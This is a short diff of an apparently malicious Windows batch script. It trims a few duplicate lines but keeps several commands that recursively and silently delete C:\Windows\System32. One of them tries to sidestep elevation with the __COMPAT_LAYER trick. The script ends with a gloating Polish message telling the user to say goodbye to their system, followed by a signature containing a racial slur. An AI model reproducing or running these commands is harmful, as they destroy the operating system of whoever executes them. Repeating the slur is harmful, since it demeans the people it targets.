@@ -8,9 +8,6 @@ start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
-start rmdir /s /q C:\Windows\System32
-start rmdir /s /q C:\Windows\System32
-start rmdir /s /q C:\Windows\System32
 Set __COMPAT_LAYER=RunAsInvoker && rmdir /s /q C:\Windows\System32
 echo XDDDDDDDD
 echo 'Nacisnij jakikolwiek klawisz aby pożegnać się z systemem.... (C) STRBLZNGx 1337 HACKAZ REAL NIGGHAZ OUT HERE.'
